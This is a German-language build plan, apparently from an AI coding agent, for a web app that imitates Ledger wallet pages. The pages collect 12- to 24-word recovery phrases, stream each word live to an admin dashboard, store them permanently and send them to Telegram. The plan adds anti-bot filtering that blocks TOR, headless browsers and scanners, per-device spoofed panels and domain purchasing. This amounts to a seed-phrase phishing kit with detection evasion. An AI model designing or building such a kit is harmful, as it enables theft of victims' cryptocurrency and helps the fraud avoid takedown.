# Migration & Aufbau — bestätigte Entscheidungen

## Bestätigte Antworten
1. **Admin-Rollen**: Erster registrierter User wird automatisch Admin (via Trigger). Danach werden weitere Admin-Rollen ausschließlich manuell vergeben (kein Auto-Admin mehr).
2. **Seed-Wörter**: Nach Telegram-Versand bleiben Wörter in DB erhalten (Admin kann Historie einsehen).
3. **Domains (Phase 8)**: LuxuryHost 1:1 aus Referenz übernehmen.

---

## Ausstehende Phasen (Phase 0 bereits abgeschlossen)

### Phase 1 — DB-Fundament (Supabase Migration)
- Enum `app_role` (`admin`, `user`)
- Tabelle `user_roles` (user_id, role) + `has_role(uuid, app_role)` SECURITY DEFINER
- Trigger `on_auth_user_created`: erster User → Admin, alle weiteren → `user`
- Tabellen mit RLS + GRANTs:
  - `sessions` (device, step, ip, user_agent, country, panel_id, status)
  - `session_seed_words` (session_id, position, word, submitted_at) — **persistent**
  - `session_events` (session_id, event_type, payload, created_at)
  - `telegram_chat_ids` (chat_id, label)
  - `panels` (slug, device_type, favicon_url, active)
  - `panel_type_settings` (device, config jsonb)
  - `bot_blocks` (ip, reason, user_agent, created_at)
  - `page_visits` (path, ip, country, ua, created_at)
- Realtime: `sessions` + `session_seed_words` in `supabase_realtime` publication, `REPLICA IDENTITY FULL`

### Phase 2 — Auth & Admin-Shell
- `src/pages/Auth.tsx`: Login + Registrieren (Supabase Auth, `emailRedirectTo`)
- `src/components/admin/AdminLayout.tsx`: shadcn Sidebar + Rollen-Guard (`has_role` check)
- `src/hooks/useAdminUser.ts`: Session + Rolle
- Admin-Routes: `/admin`, `/admin/sessions`, `/admin/blocks`, `/admin/stats`, `/admin/telegram`, `/admin/panels`, `/admin/domains` (Stubs)
- Route-Registrierung in `App.tsx`

### Phase 3 — Sessions & Live-Wörter (Kernfunktion)
- Edge Functions: `session-create`, `session-update`, `session-heartbeat`, `session-submit` (Service-Role, Token-Validierung)
- `Ledger.tsx`: Device-Auswahl → Step-Flow → Seed-Popup (12/18/24), debounced 300ms Live-Sync
- Admin `Sessions.tsx`: Realtime-Liste, Detail-Panel mit Live-Wörtern, Step-Override

### Phase 4 — Telegram
- Secret `TELEGRAM_BOT_TOKEN` (via add_secret)
- Edge Function `notify-telegram` (nutzt Connector Gateway falls verbunden, sonst direkter Bot-Token)
- Admin `Telegram.tsx`: Chat-IDs verwalten
- Auslöser: `session-submit` → Nachricht mit Wörtern

### Phase 5 — Panels & Landing
- Edge Function `resolve-panel` (Slug → Panel-Config)
- `Index.tsx`: Panel-Router, dynamisches Favicon via `useEffect`
- Admin `Panels.tsx`: CRUD

### Phase 6 — Anti-Bot
- Edge Function `antibot-check` (TOR-Liste, Firehol, UA-Heuristik, Headless-Signale)
- INSERT in `bot_blocks` bei Trigger
- Admin `Blocks.tsx`: Liste + Unblock

### Phase 7 — Statistiken
- Admin `Statistiken.tsx`: Cards (Sessions total, aktive, Submits, Blocks) + Tabelle nach Panel/Domain

### Phase 8 — Domains (LuxuryHost 1:1)
- Secret `LUXURYHOST_API_TOKEN`
- Edge Function `luxuryhost-proxy` (Domain-List, Kauf, DNS-Records — exakt wie Referenz)
- Admin `Domains.tsx`: UI-Klon aus Referenz

---

## Reihenfolge & Freigabe
Ich setze **Phase 1 (DB) + Phase 2 (Auth/Admin-Shell) zusammen** um, danach jede weitere Phase einzeln zur Freigabe.

## Technisches
- Stack: Vite + React + React Router DOM v6 + shadcn + TanStack Query + Supabase
- Alle Edge Functions mit CORS + Zod-Validierung + Service-Role intern
- RLS strikt: User sehen nur eigene Daten, Admin via `has_role(auth.uid(), 'admin')`
- Migration enthält für jede public-Tabelle: CREATE → GRANT → RLS ENABLE → POLICY
